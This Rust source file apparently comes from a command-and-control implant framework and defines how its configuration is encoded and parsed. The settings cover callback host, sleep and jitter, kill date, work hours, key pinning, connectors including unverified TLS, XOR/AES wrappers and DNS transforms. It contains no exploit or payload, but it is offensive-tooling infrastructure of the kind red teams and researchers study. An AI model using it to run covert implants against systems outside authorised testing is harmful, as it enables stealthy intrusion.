// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]
// TEMP
#![allow(unused_variables)]
#![allow(unused_mut)]
// TEMP
use core::cmp;
use core::time::Duration;

use crate::c2::cfg::workhours::WorkHours;
use crate::data::crypto::PublicKey;
use crate::data::time::Time;
use crate::data::{Reader, Writable, Writer};
use crate::io;
use crate::prelude::*;

mod connect;
mod group;
mod profile;
mod transform;
pub mod workhours;
mod wrapper;

use alloc::alloc::Global;
use core::alloc::Allocator;
use core::ops::{Deref, Index, Range, RangeFrom, RangeFull, RangeTo};

pub use self::connect::*;
pub use self::group::*;
pub use self::profile::*;
pub use self::transform::*;
pub use self::wrapper::*;

static EMPTY: [u8; 0] = [];

pub const SEPARATOR: u8 = 0xFAu8;

const INVALID: u8 = 0u8;

const SYS_HOST: u8 = 0xA0u8;
const SYS_SLEEP: u8 = 0xA1u8;
const SYS_JITTER: u8 = 0xA2u8;
const SYS_WEIGHT: u8 = 0xA3u8;
const SYS_KEY_PIN: u8 = 0xA6u8;
const SYS_KILL_DATE: u8 = 0xA4u8;
const SYS_WORK_HOURS: u8 = 0xA5u8;

pub struct Iter<'a> {
    buf: &'a [u8],
    pos: usize,
}
pub struct GroupIter<'a> {
    buf:   &'a [u8],
    pos:   isize,
    index: usize,
}
pub struct Config<'a>(pub &'a [u8]);
pub struct OwnedConfig<A: Allocator = Global>(Vec<u8, A>);

pub trait Setting<A: Allocator = Global> {
    fn as_bytes(&self) -> &[u8];

    #[inline]
    fn len(&self) -> usize {
        self.as_bytes().len()
    }
    #[inline]
    fn groups(&self) -> usize {
        group_count(self.as_bytes())
    }
    #[inline]
    fn is_empty(&self) -> bool {
        self.as_bytes().is_empty()
    }
    #[inline]
    fn iter<'a>(&'a self) -> Iter<'a> {
        Iter { buf: self.as_bytes(), pos: 0 }
    }
    #[inline]
    fn write(&self, buf: &mut Vec<u8, A>) {
        buf.extend_from_slice(self.as_bytes())
    }
    #[inline]
    fn groups_iter<'a>(&'a self) -> GroupIter<'a> {
        GroupIter {
            buf:   self.as_bytes(),
            pos:   0isize,
            index: 0usize,
        }
    }
    #[inline]
    fn group<'a>(&'a self, index: usize) -> Option<Config<'a>> {
        group(self.as_bytes(), index, -1).and_then(|(g, _)| Some(g))
    }
}

impl Config<'_> {
    #[inline]
    pub const fn new() -> OwnedConfig {
        OwnedConfig(Vec::new())
    }
    #[inline]
    pub const fn new_in<A: Allocator>(alloc: A) -> OwnedConfig<A> {
        OwnedConfig(Vec::new_in(alloc))
    }

    #[inline]
    pub fn to_owned(&self) -> OwnedConfig {
        self.to_owned_in(Global)
    }
    #[inline]
    pub fn to_owned_in<A: Allocator>(&self, alloc: A) -> OwnedConfig<A> {
        OwnedConfig(self.0.to_vec_in(alloc))
    }
}
impl OwnedConfig {
    #[inline]
    pub const fn new() -> OwnedConfig {
        OwnedConfig(Vec::new())
    }

    #[inline]
    pub fn from_stream(r: &mut impl Reader) -> io::Result<OwnedConfig> {
        OwnedConfig::from_stream_in(r, Global)
    }
}
impl<A: Allocator> OwnedConfig<A> {
    #[inline]
    pub const fn new_in(alloc: A) -> OwnedConfig<A> {
        OwnedConfig(Vec::new_in(alloc))
    }

    #[inline]
    pub fn from_stream_in(r: &mut impl Reader, alloc: A) -> io::Result<OwnedConfig<A>> {
        let mut c = OwnedConfig::new_in(alloc);
        r.read_into_vec(&mut c.0)?;
        Ok(c)
    }

    #[inline]
    pub fn as_ref<'a>(&'a self) -> Config<'a> {
        Config(&self.0)
    }
    #[inline]
    pub fn seperator(mut self) -> OwnedConfig<A> {
        self.0.reserve(1);
        self.0.push(SEPARATOR);
        self
    }
    #[inline]
    pub fn weight(mut self, weight: u8) -> OwnedConfig<A> {
        self.0.reserve(2);
        self.0.push(SYS_WEIGHT);
        self.0.push(cmp::min(weight, 100));
        self
    }
    #[inline]
    pub fn jitter(mut self, jitter: u8) -> OwnedConfig<A> {
        self.0.reserve(2);
        self.0.push(SYS_JITTER);
        self.0.push(cmp::min(jitter, 100));
        self
    }
    #[inline]
    pub fn kill_date(mut self, date: Time) -> OwnedConfig<A> {
        self.0.reserve(9);
        self.0.push(SYS_KILL_DATE);
        self.0.extend_from_slice(&u64::to_be_bytes(date.unix() as u64));
        self
    }
    #[inline]
    pub fn sleep(mut self, sleep: Duration) -> OwnedConfig<A> {
        self.0.reserve(9);
        self.0.push(SYS_SLEEP);
        self.0.extend_from_slice(&u64::to_be_bytes(sleep.as_nanos() as u64));
        self
    }
    #[inline]
    pub fn add(mut self, v: impl Setting<A>) -> OwnedConfig<A> {
        self.0.reserve(v.len());
        v.write(&mut self.0);
        self
    }
    #[inline]
    pub fn work_hours(mut self, wh: WorkHours) -> OwnedConfig<A> {
        wh.write(&mut self.0);
        self
    }
    #[inline]
    pub fn key_pin(mut self, pub_key: PublicKey) -> OwnedConfig<A> {
        self.0.reserve(5);
        self.0.push(SYS_KEY_PIN);
        self.0.extend_from_slice(&u32::to_be_bytes(pub_key.hash()));
        self
    }
    pub fn host(mut self, host: impl AsRef<str>) -> OwnedConfig<A> {
        let n = host.as_ref().as_bytes();
        let c = cmp::min(0xFFFF, n.len());
        self.0.reserve(3 + c);
        self.0.push(SYS_HOST);
        self.0.push((c >> 8) as u8);
        self.0.push(c as u8);
        self.0.extend_from_slice(&n[0..c as usize]);
        self
    }
}

impl Setting for Config<'_> {
    #[inline]
    fn as_bytes(&self) -> &[u8] {
        self.0
    }
}
impl<'a> Deref for Config<'_> {
    type Target = [u8];

    #[inline]
    fn deref(&self) -> &[u8] {
        &self.0
    }
}
impl<'a> IntoIterator for Config<'a> {
    type Item = Config<'a>;
    type IntoIter = Iter<'a>;

    #[inline]
    fn into_iter(self) -> Iter<'a> {
        Iter { buf: &self.0, pos: 0usize }
    }
}

impl Default for OwnedConfig {
    #[inline]
    fn default() -> OwnedConfig {
        OwnedConfig(Vec::new())
    }
}
impl From<&[u8]> for OwnedConfig {
    #[inline]
    fn from(v: &[u8]) -> OwnedConfig {
        OwnedConfig(v.to_vec())
    }
}
impl<'a> IntoIterator for &'a OwnedConfig {
    type Item = Config<'a>;
    type IntoIter = Iter<'a>;

    #[inline]
    fn into_iter(self) -> Iter<'a> {
        Iter { buf: &self.0, pos: 0usize }
    }
}
impl<A: Allocator> Setting for OwnedConfig<A> {
    #[inline]
    fn as_bytes(&self) -> &[u8] {
        &self.0
    }
}
impl<A: Allocator> Writable for OwnedConfig<A> {
    #[inline]
    fn write_stream(&self, w: &mut impl Writer) -> io::Result<()> {
        w.write_bytes(&self.0)
    }
}
impl<A: Allocator> Into<Vec<u8, A>> for OwnedConfig<A> {
    #[inline]
    fn into(self) -> Vec<u8, A> {
        self.0
    }
}
impl<A: Allocator> From<Vec<u8, A>> for OwnedConfig<A> {
    #[inline]
    fn from(v: Vec<u8, A>) -> OwnedConfig<A> {
        OwnedConfig(v)
    }
}

impl<'a> Iterator for Iter<'a> {
    type Item = Config<'a>;

    #[inline]
    fn next(&mut self) -> Option<Config<'a>> {
        match next(self.buf, self.pos) {
            Some(i) => {
                let r = Config(&self.buf[self.pos..i]);
                self.pos = i;
                Some(r)
            },
            None => None,
        }
    }
}
impl<'a> Iterator for GroupIter<'a> {
    type Item = Config<'a>;

    #[inline]
    fn next(&mut self) -> Option<Config<'a>> {
        if self.pos == -1 {
            return None;
        }
        match group(self.buf, self.index, self.pos) {
            Some((g, p)) => {
                (self.index, self.pos) = (self.index + 1, p);
                Some(g)
            },
            None => None,
        }
    }
}

impl Index<usize> for OwnedConfig {
    type Output = u8;

    #[inline]
    fn index(&self, index: usize) -> &u8 {
        &self.0[index]
    }
}
impl<'a> Index<usize> for Config<'_> {
    type Output = u8;

    #[inline]
    fn index(&self, index: usize) -> &u8 {
        &self.0[index]
    }
}
impl Index<RangeFull> for OwnedConfig {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeFull) -> &[u8] {
        &self.0[index]
    }
}
impl<'a> Index<RangeFull> for Config<'_> {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeFull) -> &[u8] {
        &self.0[index]
    }
}
impl Index<Range<usize>> for OwnedConfig {
    type Output = [u8];

    #[inline]
    fn index(&self, index: Range<usize>) -> &[u8] {
        &self.0[index]
    }
}
impl Index<RangeTo<usize>> for OwnedConfig {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeTo<usize>) -> &[u8] {
        &self.0[index]
    }
}
impl<'a> Index<Range<usize>> for Config<'_> {
    type Output = [u8];

    #[inline]
    fn index(&self, index: Range<usize>) -> &[u8] {
        &self.0[index]
    }
}
impl Index<RangeFrom<usize>> for OwnedConfig {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeFrom<usize>) -> &[u8] {
        &self.0[index]
    }
}
impl<'a> Index<RangeTo<usize>> for Config<'_> {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeTo<usize>) -> &[u8] {
        &self.0[index]
    }
}
impl<'a> Index<RangeFrom<usize>> for Config<'_> {
    type Output = [u8];

    #[inline]
    fn index(&self, index: RangeFrom<usize>) -> &[u8] {
        &self.0[index]
    }
}

fn group_count(buf: &[u8]) -> usize {
    let (mut p, mut n) = (0, 0);
    if buf.is_empty() {
        return 0;
    }
    if buf[0] == SEPARATOR {
        p += 1;
    }
    loop {
        match next_group(buf, p) {
            Some(i) => (p, n) = (i + 1, n + 1),
            None => break,
        }
    }
    n + 1
}
#[inline]
fn short(buf: &[u8], pos: usize) -> usize {
    buf[pos + 1] as usize | (buf[pos] as usize) << 8
}
fn next(buf: &[u8], pos: usize) -> Option<usize> {
    if pos >= buf.len() {
        return None;
    }
    match buf[pos] {
        INVALID => None,
        SEPARATOR | WRAP_HEX | WRAP_ZLIB | WRAP_GZIP | WRAP_BASE64 => Some(pos + 1),
        SELECTOR_RANDOM | SELECTOR_SEMI_RANDOM | SELECTOR_LAST_VALID | SELECTOR_ROUND_ROBIN | SELECTOR_SEMI_ROUND_ROBIN | SELECTOR_SEMI_LAST_VALID => Some(pos + 1),
        CONNECT_TCP | CONNECT_TLS | CONNECT_UDP | CONNECT_ICMP | CONNECT_PIPE | CONNECT_TLS_NO_VERIFY | TRANSFORM_BASE64 => Some(pos + 1),
        SYS_JITTER | CONNECT_TLS_EX | SYS_WEIGHT | TRANSFORM_BASE64_SHIFT | CONNECT_IP | SELECTOR_PERCENT | SELECTOR_PERCENT_ROUND_ROBIN => Some(pos + 2),
        SYS_WORK_HOURS | WRAP_CBK => Some(pos + 6),
        SYS_SLEEP | SYS_KILL_DATE => Some(pos + 9),
        SYS_KEY_PIN => Some(pos + 5),
        CONNECT_WC2 => {
            if pos + 7 >= buf.len() {
                return None;
            }
            let mut n = pos + 8 + short(buf, pos + 1) + short(buf, pos + 3) + short(buf, pos + 5);
            if n >= buf.len() {
                return None;
            }
            if buf[pos + 7] == 0 {
                return Some(n);
            }
            for _ in (0..buf[pos + 7]).rev() {
                if n >= buf.len() {
                    break;
                }
                n += (buf[n] as usize) + (buf[n + 1] as usize) + 2;
            }
            Some(n)
        },
        WRAP_XOR | SYS_HOST => {
            if pos + 3 >= buf.len() {
                return None;
            }
            Some(pos + 3 + short(buf, pos + 1))
        },
        WRAP_AES => {
            if pos + 3 >= buf.len() {
                return None;
            }
            Some(pos + 3 + buf[pos + 1] as usize + buf[pos + 2] as usize)
        },
        CONNECT_MU_TLS => {
            if pos + 7 >= buf.len() {
                return None;
            }
            Some(pos + 8 + short(buf, pos + 2) + short(buf, pos + 4) + short(buf, pos + 6))
        },
        CONNECT_TLS_CA => {
            if pos + 4 >= buf.len() {
                return None;
            }
            Some(pos + 4 + short(buf, pos + 2))
        },
        CONNECT_TLS_CERT => {
            if pos + 6 >= buf.len() {
                return None;
            }
            Some(pos + 6 + short(buf, pos + 2) + short(buf, pos + 4))
        },
        TRANSFORM_DNS => {
            if pos + 1 >= buf.len() {
                return None;
            }
            let mut n = pos + 2;
            for _ in (0..buf[pos + 1]).rev() {
                if n >= buf.len() {
                    break;
                }
                n += buf[n] as usize + 1;
            }
            Some(n)
        },
        _ => None,
    }
}
#[inline]
fn group_iter<'a>(buf: &'a [u8]) -> GroupIter<'a> {
    GroupIter { buf, pos: 0isize, index: 0usize }
}
fn next_group(buf: &[u8], pos: usize) -> Option<usize> {
    let mut p = pos;
    loop {
        if p >= buf.len() {
            break;
        }
        match next(buf, p) {
            Some(i) => {
                if i >= buf.len() {
                    return None;
                } else if buf[i] == SEPARATOR {
                    return Some(i);
                }
                p = i;
            },
            None => break,
        }
    }
    None
}
fn group<'a>(buf: &'a [u8], index: usize, pos: isize) -> Option<(Config<'a>, isize)> {
    if buf.is_empty() || index > buf.len() {
        return None;
    }
    let (mut p, mut n) = (cmp::max(pos as usize, 0), 0);
    if buf[p] == SEPARATOR {
        p += 1;
    }
    loop {
        match next_group(buf, p) {
            Some(i) => {
                if index == n {
                    return Some((Config(&buf[p..i]), i as isize));
                }
                (p, n) = (i + 1, n + 1);
            },
            None => break,
        }
    }
    // TODO(dij): Watch this one for bugs.
    if index > n && pos < 0 {
        None
    } else if p > 0 && p < buf.len() {
        // We dropped the requirement for n > 0 here.
        Some((Config(&buf[p..]), -1))
    } else if index == 0 && n == 0 {
        Some((Config(&buf), -1))
    } else {
        None
    }
}

#[cfg(feature = "strip")]
mod display {
    use core::fmt::{self, Debug, Display, Formatter, UpperHex};

    use crate::c2::cfg::ProfileError;
    use crate::prelude::*;

    impl Debug for ProfileError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            UpperHex::fmt(&self.0, f)
        }
    }
    impl Display for ProfileError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            UpperHex::fmt(&self.0, f)
        }
    }
}
#[cfg(not(feature = "strip"))]
mod display {
    use core::alloc::Allocator;
    use core::fmt::{self, Debug, Display, Formatter};
    use core::str::from_utf8;
    use core::time::Duration;

    use crate::c2::cfg::{self, OwnedConfig, ProfileError};
    use crate::data::base64::encode_write;
    use crate::data::time::Time;
    use crate::data::{read_u32, read_u64};
    use crate::ignore_error;
    use crate::prelude::*;
    use crate::util::ToStr;

    impl Debug for ProfileError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str("error parsing config: ")?;
            let mut s = String::new();
            name(&mut s, self.0);
            f.write_str(&s)
        }
    }
    impl Display for ProfileError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str("error parsing config: ")?;
            let mut s = String::new();
            name(&mut s, self.0);
            f.write_str(&s)
        }
    }

    impl<A: Allocator> Debug for OwnedConfig<A> {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str(&to_string(&self.0, true))
        }
    }
    impl<A: Allocator> Display for OwnedConfig<A> {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str(&to_string(&self.0, false))
        }
    }

    #[inline]
    fn name(buf: &mut String, b: u8) {
        buf.push_str(match b {
            cfg::SEPARATOR => "|",
            cfg::SYS_HOST => "host",
            cfg::SYS_SLEEP => "sleep",
            cfg::SYS_JITTER => "jitter",
            cfg::SYS_WEIGHT => "weight",
            cfg::SYS_KEY_PIN => "keypin",
            cfg::SYS_KILL_DATE => "killdate",
            cfg::SYS_WORK_HOURS => "workhours",
            cfg::SELECTOR_LAST_VALID => "select-last",
            cfg::SELECTOR_ROUND_ROBIN => "select-round-robin",
            cfg::SELECTOR_RANDOM => "select-random",
            cfg::SELECTOR_SEMI_ROUND_ROBIN => "select-semi-round-robin",
            cfg::SELECTOR_SEMI_RANDOM => "select-semi-random",
            cfg::SELECTOR_PERCENT => "select-percent",
            cfg::SELECTOR_PERCENT_ROUND_ROBIN => "select-percent-round-robin",
            cfg::SELECTOR_SEMI_LAST_VALID => "select-semi-last",
            cfg::CONNECT_TCP => "tcp",
            cfg::CONNECT_TLS => "tls",
            cfg::CONNECT_UDP => "udp",
            cfg::CONNECT_ICMP => "icmp",
            cfg::CONNECT_PIPE => "pipe",
            cfg::CONNECT_TLS_NO_VERIFY => "tls-insecure",
            cfg::CONNECT_IP => "ip",
            cfg::CONNECT_WC2 => "wc2",
            cfg::CONNECT_TLS_EX => "tls-ex",
            cfg::CONNECT_MU_TLS => "mtls",
            cfg::CONNECT_TLS_CA => "tls-ca",
            cfg::CONNECT_TLS_CERT => "tls-cert",
            cfg::WRAP_HEX => "hex",
            cfg::WRAP_ZLIB => "zlib",
            cfg::WRAP_GZIP => "gzip",
            cfg::WRAP_BASE64 => "base64",
            cfg::WRAP_XOR => "xor",
            cfg::WRAP_CBK => "cbk",
            cfg::WRAP_AES => "aes",
            cfg::TRANSFORM_BASE64 => "b64t",
            cfg::TRANSFORM_DNS => "dns",
            cfg::TRANSFORM_BASE64_SHIFT => "b64s",
            _ => "<invalid>",
        })
    }
    fn debug(buf: &mut String, b: &[u8]) {
        match b[0] {
            cfg::WRAP_HEX | cfg::WRAP_ZLIB | cfg::WRAP_GZIP | cfg::WRAP_BASE64 => return,
            cfg::SELECTOR_LAST_VALID | cfg::SELECTOR_ROUND_ROBIN | cfg::SELECTOR_RANDOM | cfg::SELECTOR_SEMI_RANDOM | cfg::SELECTOR_SEMI_ROUND_ROBIN => return,
            cfg::CONNECT_TCP | cfg::CONNECT_TLS | cfg::CONNECT_UDP | cfg::CONNECT_ICMP | cfg::CONNECT_PIPE | cfg::CONNECT_TLS_NO_VERIFY => return,
            cfg::TRANSFORM_BASE64 => return,
            cfg::SEPARATOR => return,
            _ => (),
        }
        buf.push('[');
        match b[0] {
            cfg::SYS_HOST => {
                let n = cfg::short(b, 1) + 3;
                if n <= b.len() {
                    if let Ok(v) = from_utf8(&b[3..n]) {
                        buf.push_str(v)
                    }
                }
            },
            cfg::SYS_SLEEP => buf.push_str(&format!("{:?}", Duration::from_nanos(read_u64(&b[1..9])))),
            cfg::SYS_KEY_PIN => read_u32(&b[1..5]).into_vec(unsafe { buf.as_mut_vec() }),
            cfg::SYS_KILL_DATE => buf.push_str(&Time::from_nano(read_u64(&b[1..9]) as i64).to_string()),
            cfg::SYS_WORK_HOURS => (),
            cfg::SYS_JITTER | cfg::SYS_WEIGHT | cfg::CONNECT_IP | cfg::CONNECT_TLS_EX | cfg::TRANSFORM_BASE64_SHIFT | cfg::SELECTOR_PERCENT | cfg::SELECTOR_PERCENT_ROUND_ROBIN => b[1].into_vec(unsafe { buf.as_mut_vec() }),
            cfg::WRAP_XOR => {
                let n = cfg::short(b, 1) + 3;
                if n <= b.len() {
                    ignore_error!(encode_write(&b[3..n], unsafe { buf.as_mut_vec() }));
                }
            },
            _ => (),
        }
        buf.push(']');
    }
    fn to_string(buf: &[u8], data: bool) -> String {
        let (mut b, mut p) = (String::new(), 0);
        loop {
            match cfg::next(buf, p) {
                Some(i) => {
                    name(&mut b, buf[p]);
                    if data {
                        debug(&mut b, &buf[p..i])
                    }
                    if i < buf.len() && buf[p] != cfg::SEPARATOR && buf[i] != cfg::SEPARATOR {
                        b.push(',')
                    }
                    p = i;
                },
                None => break,
            }
        }
        b
    }
}
